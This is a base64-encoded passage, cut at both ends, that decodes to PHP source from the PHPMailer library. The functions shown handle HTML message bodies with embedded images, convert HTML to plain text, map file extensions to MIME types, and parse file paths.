NhZ2UgQm9keQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBtc2dIVE1MKCRtZXNzYWdlLCAkYmFzZWRpciA9ICcnLCAkYWR2YW5jZWQgPSBmYWxzZSkNCiAgICB7DQogICAgICAgIHByZWdfbWF0Y2hfYWxsKCcvKHNyY3xiYWNrZ3JvdW5kKT1bIlwnXSguKilbIlwnXS9VaScsICRtZXNzYWdlLCAkaW1hZ2VzKTsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGltYWdlcykpIHsNCiAgICAgICAgICAgIGlmIChzdHJsZW4oJGJhc2VkaXIpID4gMSAmJiBzdWJzdHIoJGJhc2VkaXIsIC0xKSAhPSAnLycpIHsNCiAgICAgICAgICAgICAgICAvLyBFbnN1cmUgJGJhc2VkaXIgaGFzIGEgdHJhaWxpbmcgLw0KICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCRpbWFnZXNbMl0gYXMgJGltZ2luZGV4ID0+ICR1cmwpIHsNCiAgICAgICAgICAgICAgICAvLyBDb252ZXJ0IGRhdGEgVVJJcyBpbnRvIGVtYmVkZGVkIGltYWdlcw0KICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcjXmRhdGE6KGltYWdlW147LF0qKSg7YmFzZTY0KT8sIycsICR1cmwsICRtYXRjaCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBzdWJzdHIoJHVybCwgc3RycG9zKCR1cmwsICcsJykpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJG1hdGNoWzJdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IGJhc2U2NF9kZWNvZGUoJGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSByYXd1cmxkZWNvZGUoJGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRjaWQgPSBtZDUoJHVybCkgLiAnQHBocG1haWxlci4wJzsgLy8gUkZDMjM5MiBTIDINCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRkYXRhLCAkY2lkLCAnZW1iZWQnIC4gJGltZ2luZGV4LCAnYmFzZTY0JywgJG1hdGNoWzFdKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdHJfcmVwbGFjZSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzWzBdWyRpbWdpbmRleF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoDQogICAgICAgICAgICAgICAgICAgIC8vIE9ubHkgcHJvY2VzcyByZWxhdGl2ZSBVUkxzIGlmIGEgYmFzZWRpciBpcyBwcm92aWRlZCAoaS5lLiBubyBhYnNvbHV0ZSBsb2NhbCBwYXRocykNCiAgICAgICAgICAgICAgICAgICAgIWVtcHR5KCRiYXNlZGlyKQ0KICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgVVJMcyBjb250YWluaW5nIHBhcmVudCBkaXIgdHJhdmVyc2FsICguLikNCiAgICAgICAgICAgICAgICAgICAgJiYgKHN0cnBvcygkdXJsLCAnLi4nKSA9PT0gZmFsc2UpDQogICAgICAgICAgICAgICAgICAgIC8vIERvIG5vdCBjaGFuZ2UgdXJscyB0aGF0IGFyZSBhbHJlYWR5IGlubGluZSBpbWFnZXMNCiAgICAgICAgICAgICAgICAgICAgJiYgc3Vic3RyKCR1cmwsIDAsIDQpICE9PSAnY2lkOicNCiAgICAgICAgICAgICAgICAgICAgLy8gRG8gbm90IGNoYW5nZSBhYnNvbHV0ZSBVUkxzLCBpbmNsdWRpbmcgYW5vbnltb3VzIHByb3RvY29sDQogICAgICAgICAgICAgICAgICAgICYmICFwcmVnX21hdGNoKCcjXlthLXpdW2EtejAtOSsuLV0qOj8vLyNpJywgJHVybCkNCiAgICAgICAgICAgICAgICApIHsNCiAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHVybCk7DQogICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSBkaXJuYW1lKCR1cmwpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PSAnLicpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSAnJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyDQogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGRpcmVjdG9yeSkgPiAxICYmIHN1YnN0cigkZGlyZWN0b3J5LCAtMSkgIT0gJy8nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5IC49ICcvJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoDQogICAgICAgICAgICAgICAgICAgICAgICAkYmFzZWRpciAuICRkaXJlY3RvcnkgLiAkZmlsZW5hbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAkY2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2Jhc2U2NCcsDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmOjpfbWltZV90eXBlcygoc3RyaW5nKXNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICcvJyAuICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9WyJcJ10nIC4gcHJlZ19xdW90ZSgkdXJsLCAnLycpIC4gJ1siXCddL1VpJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPSJjaWQ6JyAuICRjaWQgLiAnIicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UNCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmlzSFRNTCh0cnVlKTsNCiAgICAgICAgLy8gQ29udmVydCBhbGwgbWVzc2FnZSBib2R5IGxpbmUgYnJlYWtzIHRvIENSTEYsIG1ha2VzIHF1b3RlZC1wcmludGFibGUgZW5jb2Rpbmcgd29yayBtdWNoIGJldHRlcg0KICAgICAgICAkdGhpcy0+Qm9keSA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJG1lc3NhZ2UpOw0KICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJHRoaXMtPmh0bWwydGV4dCgkbWVzc2FnZSwgJGFkdmFuY2VkKSk7DQogICAgICAgIGlmICghJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5BbHRCb2R5ID0gJ1RvIHZpZXcgdGhpcyBlbWFpbCBtZXNzYWdlLCBvcGVuIGl0IGluIGEgcHJvZ3JhbSB0aGF0IHVuZGVyc3RhbmRzIEhUTUwhJyAuDQogICAgICAgICAgICAgICAgc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEY7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5Cb2R5Ow0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIENvbnZlcnQgYW4gSFRNTCBzdHJpbmcgaW50byBwbGFpbiB0ZXh0Lg0KICAgICAqIFRoaXMgaXMgdXNlZCBieSBtc2dIVE1MKCkuDQogICAgICogTm90ZSAtIG9sZGVyIHZlcnNpb25zIG9mIHRoaXMgZnVuY3Rpb24gdXNlZCBhIGJ1bmRsZWQgYWR2YW5jZWQgY29udmVydGVyDQogICAgICogd2hpY2ggd2FzIGJlZW4gcmVtb3ZlZCBmb3IgbGljZW5zZSByZWFzb25zIGluICMyMzIuDQogICAgICogRXhhbXBsZSB1c2FnZToNCiAgICAgKiA8Y29kZT4NCiAgICAgKiAvLyBVc2UgZGVmYXVsdCBjb252ZXJzaW9uDQogICAgICogJHBsYWluID0gJG1haWwtPmh0bWwydGV4dCgkaHRtbCk7DQogICAgICogLy8gVXNlIHlvdXIgb3duIGN1c3RvbSBjb252ZXJ0ZXINCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sLCBmdW5jdGlvbigkaHRtbCkgew0KICAgICAqICAgICAkY29udmVydGVyID0gbmV3IE15SHRtbDJ0ZXh0KCRodG1sKTsNCiAgICAgKiAgICAgcmV0dXJuICRjb252ZXJ0ZXItPmdldF90ZXh0KCk7DQogICAgICogfSk7DQogICAgICogPC9jb2RlPg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGh0bWwgVGhlIEhUTUwgdGV4dCB0byBjb252ZXJ0DQogICAgICogQHBhcmFtIGJvb2xlYW58Y2FsbGFibGUgJGFkdmFuY2VkIEFueSBib29sZWFuIHZhbHVlIHRvIHVzZSB0aGUgaW50ZXJuYWwgY29udmVydGVyLA0KICAgICAqICAgb3IgcHJvdmlkZSB5b3VyIG93biBjYWxsYWJsZSBmb3IgY3VzdG9tIGNvbnZlcnNpb24uDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gaHRtbDJ0ZXh0KCRodG1sLCAkYWR2YW5jZWQgPSBmYWxzZSkNCiAgICB7DQogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7DQogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJGFkdmFuY2VkLCAkaHRtbCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGh0bWxfZW50aXR5X2RlY29kZSgNCiAgICAgICAgICAgIHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8c2NyaXB0KVtePl0qPi4qPzxcLwE+L3NpJywgJycsICRodG1sKSkpLA0KICAgICAgICAgICAgRU5UX1FVT1RFUywNCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0DQogICAgICAgICk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogR2V0IHRoZSBNSU1FIHR5cGUgZm9yIGEgZmlsZSBleHRlbnNpb24uDQogICAgICogQHBhcmFtIHN0cmluZyAkZXh0IEZpbGUgZXh0ZW5zaW9uDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIHN0cmluZyBNSU1FIHR5cGUgb2YgZmlsZS4NCiAgICAgKiBAc3RhdGljDQogICAgICovDQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBfbWltZV90eXBlcygkZXh0ID0gJycpDQogICAgew0KICAgICAgICAkbWltZXMgPSBhcnJheSgNCiAgICAgICAgICAgICd4bCcgICAgPT4gJ2FwcGxpY2F0aW9uL2V4Y2VsJywNCiAgICAgICAgICAgICdqcycgICAgPT4gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLA0KICAgICAgICAgICAgJ2hxeCcgICA9PiAnYXBwbGljYXRpb24vbWFjLWJpbmhleDQwJywNCiAgICAgICAgICAgICdjcHQnICAgPT4gJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywNCiAgICAgICAgICAgICdiaW4nICAgPT4gJ2FwcGxpY2F0aW9uL21hY2JpbmFyeScsDQogICAgICAgICAgICAnZG9jJyAgID0+ICdhcHBsaWNhdGlvbi9tc3dvcmQnLA0KICAgICAgICAgICAgJ3dvcmQnICA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywNCiAgICAgICAgICAgICd4bHN4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnNoZWV0JywNCiAgICAgICAgICAgICd4bHR4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnRlbXBsYXRlJywNCiAgICAgICAgICAgICdwb3R4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC50ZW1wbGF0ZScsDQogICAgICAgICAgICAncHBzeCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGVzaG93JywNCiAgICAgICAgICAgICdwcHR4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5wcmVzZW50YXRpb24nLA0KICAgICAgICAgICAgJ3NsZHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnNsaWRlJywNCiAgICAgICAgICAgICdkb2N4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLmRvY3VtZW50JywNCiAgICAgICAgICAgICdkb3R4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLnRlbXBsYXRlJywNCiAgICAgICAgICAgICd4bGFtJyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbC5hZGRpbi5tYWNyb0VuYWJsZWQuMTInLA0KICAgICAgICAgICAgJ3hsc2InICA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLnNoZWV0LmJpbmFyeS5tYWNyb0VuYWJsZWQuMTInLA0KICAgICAgICAgICAgJ2NsYXNzJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdkbGwnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnZG1zJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2V4ZScgICA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdsaGEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnbHpoJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ3BzZCcgICA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdzZWEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnc28nICAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ29kYScgICA9PiAnYXBwbGljYXRpb24vb2RhJywNCiAgICAgICAgICAgICdwZGYnICAgPT4gJ2FwcGxpY2F0aW9uL3BkZicsDQogICAgICAgICAgICAnYWknICAgID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywNCiAgICAgICAgICAgICdlcHMnICAgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLA0KICAgICAgICAgICAgJ3BzJyAgICA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsDQogICAgICAgICAgICAnc21pJyAgID0+ICdhcHBsaWNhdGlvbi9zbWlsJywNCiAgICAgICAgICAgICdzbWlsJyAgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLA0KICAgICAgICAgICAgJ21pZicgICA9PiAnYXBwbGljYXRpb24vdm5kLm1pZicsDQogICAgICAgICAgICAneGxzJyAgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLA0KICAgICAgICAgICAgJ3BwdCcgICA9PiAnYXBwbGljYXRpb24vdm5kLm1zLXBvd2VycG9pbnQnLA0KICAgICAgICAgICAgJ3dieG1sJyA9PiAnYXBwbGljYXRpb24vdm5kLndhcC53YnhtbCcsDQogICAgICAgICAgICAnd21sYycgID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLA0KICAgICAgICAgICAgJ2RjcicgICA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsDQogICAgICAgICAgICAnZGlyJyAgID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywNCiAgICAgICAgICAgICdkeHInICAgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLA0KICAgICAgICAgICAgJ2R2aScgICA9PiAnYXBwbGljYXRpb24veC1kdmknLA0KICAgICAgICAgICAgJ2d0YXInICA9PiAnYXBwbGljYXRpb24veC1ndGFyJywNCiAgICAgICAgICAgICdwaHAzJyAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHA0JyAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHAnICAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHBzJyAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwLXNvdXJjZScsDQogICAgICAgICAgICAnc3dmJyAgID0+ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsDQogICAgICAgICAgICAnc2l0JyAgID0+ICdhcHBsaWNhdGlvbi94LXN0dWZmaXQnLA0KICAgICAgICAgICAgJ3RhcicgICA9PiAnYXBwbGljYXRpb24veC10YXInLA0KICAgICAgICAgICAgJ3RneicgICA9PiAnYXBwbGljYXRpb24veC10YXInLA0KICAgICAgICAgICAgJ3hodCcgICA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywNCiAgICAgICAgICAgICd4aHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3hodG1sK3htbCcsDQogICAgICAgICAgICAnemlwJyAgID0+ICdhcHBsaWNhdGlvbi96aXAnLA0KICAgICAgICAgICAgJ21pZCcgICA9PiAnYXVkaW8vbWlkaScsDQogICAgICAgICAgICAnbWlkaScgID0+ICdhdWRpby9taWRpJywNCiAgICAgICAgICAgICdtcDInICAgPT4gJ2F1ZGlvL21wZWcnLA0KICAgICAgICAgICAgJ21wMycgICA9PiAnYXVkaW8vbXBlZycsDQogICAgICAgICAgICAnbXBnYScgID0+ICdhdWRpby9tcGVnJywNCiAgICAgICAgICAgICdhaWYnICAgPT4gJ2F1ZGlvL3gtYWlmZicsDQogICAgICAgICAgICAnYWlmYycgID0+ICdhdWRpby94LWFpZmYnLA0KICAgICAgICAgICAgJ2FpZmYnICA9PiAnYXVkaW8veC1haWZmJywNCiAgICAgICAgICAgICdyYW0nICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywNCiAgICAgICAgICAgICdybScgICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywNCiAgICAgICAgICAgICdycG0nICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvLXBsdWdpbicsDQogICAgICAgICAgICAncmEnICAgID0+ICdhdWRpby94LXJlYWxhdWRpbycsDQogICAgICAgICAgICAnd2F2JyAgID0+ICdhdWRpby94LXdhdicsDQogICAgICAgICAgICAnYm1wJyAgID0+ICdpbWFnZS9ibXAnLA0KICAgICAgICAgICAgJ2dpZicgICA9PiAnaW1hZ2UvZ2lmJywNCiAgICAgICAgICAgICdqcGVnJyAgPT4gJ2ltYWdlL2pwZWcnLA0KICAgICAgICAgICAgJ2pwZScgICA9PiAnaW1hZ2UvanBlZycsDQogICAgICAgICAgICAnanBnJyAgID0+ICdpbWFnZS9qcGVnJywNCiAgICAgICAgICAgICdwbmcnICAgPT4gJ2ltYWdlL3BuZycsDQogICAgICAgICAgICAndGlmZicgID0+ICdpbWFnZS90aWZmJywNCiAgICAgICAgICAgICd0aWYnICAgPT4gJ2ltYWdlL3RpZmYnLA0KICAgICAgICAgICAgJ2VtbCcgICA9PiAnbWVzc2FnZS9yZmM4MjInLA0KICAgICAgICAgICAgJ2NzcycgICA9PiAndGV4dC9jc3MnLA0KICAgICAgICAgICAgJ2h0bWwnICA9PiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICdodG0nICAgPT4gJ3RleHQvaHRtbCcsDQogICAgICAgICAgICAnc2h0bWwnID0+ICd0ZXh0L2h0bWwnLA0KICAgICAgICAgICAgJ2xvZycgICA9PiAndGV4dC9wbGFpbicsDQogICAgICAgICAgICAndGV4dCcgID0+ICd0ZXh0L3BsYWluJywNCiAgICAgICAgICAgICd0eHQnICAgPT4gJ3RleHQvcGxhaW4nLA0KICAgICAgICAgICAgJ3J0eCcgICA9PiAndGV4dC9yaWNodGV4dCcsDQogICAgICAgICAgICAncnRmJyAgID0+ICd0ZXh0L3J0ZicsDQogICAgICAgICAgICAndmNmJyAgID0+ICd0ZXh0L3ZjYXJkJywNCiAgICAgICAgICAgICd2Y2FyZCcgPT4gJ3RleHQvdmNhcmQnLA0KICAgICAgICAgICAgJ3htbCcgICA9PiAndGV4dC94bWwnLA0KICAgICAgICAgICAgJ3hzbCcgICA9PiAndGV4dC94bWwnLA0KICAgICAgICAgICAgJ21wZWcnICA9PiAndmlkZW8vbXBlZycsDQogICAgICAgICAgICAnbXBlJyAgID0+ICd2aWRlby9tcGVnJywNCiAgICAgICAgICAgICdtcGcnICAgPT4gJ3ZpZGVvL21wZWcnLA0KICAgICAgICAgICAgJ21vdicgICA9PiAndmlkZW8vcXVpY2t0aW1lJywNCiAgICAgICAgICAgICdxdCcgICAgPT4gJ3ZpZGVvL3F1aWNrdGltZScsDQogICAgICAgICAgICAncnYnICAgID0+ICd2aWRlby92bmQucm4tcmVhbHZpZGVvJywNCiAgICAgICAgICAgICdhdmknICAgPT4gJ3ZpZGVvL3gtbXN2aWRlbycsDQogICAgICAgICAgICAnbW92aWUnID0+ICd2aWRlby94LXNnaS1tb3ZpZScNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkZXh0KSwgJG1pbWVzKSkgew0KICAgICAgICAgICAgcmV0dXJuICRtaW1lc1tzdHJ0b2xvd2VyKCRleHQpXTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogTWFwIGEgZmlsZSBuYW1lIHRvIGEgTUlNRSB0eXBlLg0KICAgICAqIERlZmF1bHRzIHRvICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLCBpLmUuLiBhcmJpdHJhcnkgYmluYXJ5IGRhdGEuDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUgQSBmaWxlIG5hbWUgb3IgZnVsbCBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICogQHN0YXRpYw0KICAgICAqLw0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKQ0KICAgIHsNCiAgICAgICAgLy8gSW4gY2FzZSB0aGUgcGF0aCBpcyBhIFVSTCwgc3RyaXAgYW55IHF1ZXJ5IHN0cmluZyBiZWZvcmUgZ2V0dGluZyBleHRlbnNpb24NCiAgICAgICAgJHFwb3MgPSBzdHJwb3MoJGZpbGVuYW1lLCAnPycpOw0KICAgICAgICBpZiAoZmFsc2UgIT09ICRxcG9zKSB7DQogICAgICAgICAgICAkZmlsZW5hbWUgPSBzdWJzdHIoJGZpbGVuYW1lLCAwLCAkcXBvcyk7DQogICAgICAgIH0NCiAgICAgICAgJHBhdGhpbmZvID0gc2VsZjo6bWJfcGF0aGluZm8oJGZpbGVuYW1lKTsNCiAgICAgICAgcmV0dXJuIHNlbGY6Ol9taW1lX3R5cGVzKCRwYXRoaW5mb1snZXh0ZW5zaW9uJ10pOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIE11bHRpLWJ5dGUtc2FmZSBwYXRoaW5mbyByZXBsYWNlbWVudC4NCiAgICAgKiBEcm9wLWluIHJlcGxhY2VtZW50IGZvciBwYXRoaW5mbygpLCBidXQgbXVsdGlieXRlLXNhZmUsIGNyb3NzLXBsYXRmb3JtLXNhZmUsIG9sZC12ZXJzaW9uLXNhZmUuDQogICAgICogV29ya3Mgc2ltaWxhcmx5IHRvIHRoZSBvbmUgaW4gUEhQID49IDUuMi4wDQogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5wYXRoaW5mby5waHAjMTA3NDYxDQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBBIGZpbGVuYW1lIG9yIHBhdGgsIGRvZXMgbm90IG5lZWQgdG8gZXhpc3QgYXMgYSBmaWxlDQogICAgICogQHBhcmFtIGludGVnZXJ8c3RyaW5nICRvcHRpb25zIEVpdGhlciBhIFBBVEhJTkZPXyogY29uc3RhbnQsDQogICAgICogICAgICBvciBhIHN0cmluZyBuYW1lIHRvIHJldHVybiBvbmx5IHRoZSBzcGVjaWZpZWQgcGllY2UsIGFsbG93cyAnZmlsZW5hbWUnIHRvIHdvcmsgb24gUEhQIDwgNS4yDQogICAgICogQHJldHVybiBzdHJpbmd8YXJyYXkNCiAgICAgKiBAc3RhdGljDQogICAgICovDQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBtYl9wYXRoaW5mbygkcGF0aCwgJG9wdGlvbnMgPSBudWxsKQ0KICAgIHsNCiAgICAgICAgJHJldCA9IGFycmF5KCdkaXJuYW1lJyA9PiAnJywgJ2Jhc2VuYW1lJyA9PiAnJywgJ2V4dGVuc2lvbicgPT4gJycsICdmaWxlbmFtZScgPT4gJycpOw0KICAgICAgICAkcGF0aGluZm8gPSBhcnJheSgpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaCgnJV4oLio/KVtcL10qKChbXi9cXSo/KShcLihbXlwuXC9dKz8pfCkpW1wvXC5dKiQlaW0nLCAkcGF0aCwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMSwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2Rpcm5hbWUnXSA9ICRwYXRoaW5mb1sxXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgICAgICAkcmV0WydiYXNlbmFtZSddID0gJHBhdGhpbmZvWzJdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoNSwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2V4dGVuc2lvbiddID0gJHBhdGhpbmZvWzVdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMywgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2ZpbGVuYW1lJ10gPSAkcGF0aGluZm9bM107DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkb3B0aW9ucykgew0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19ESVJOQU1FOg0KICAgICAgICAgICAgY2FzZSAnZGlybmFtZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Rpcm5hbWUnXTsNCiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fQkFTRU5BTUU6DQogICAgICAgICAgICBjYXNlICdiYXNlbmFtZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Jhc2VuYW1lJ107DQogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0VYVEVOU0lPTjoNCiAgICAgICAgICAgIGNhc2UgJ2V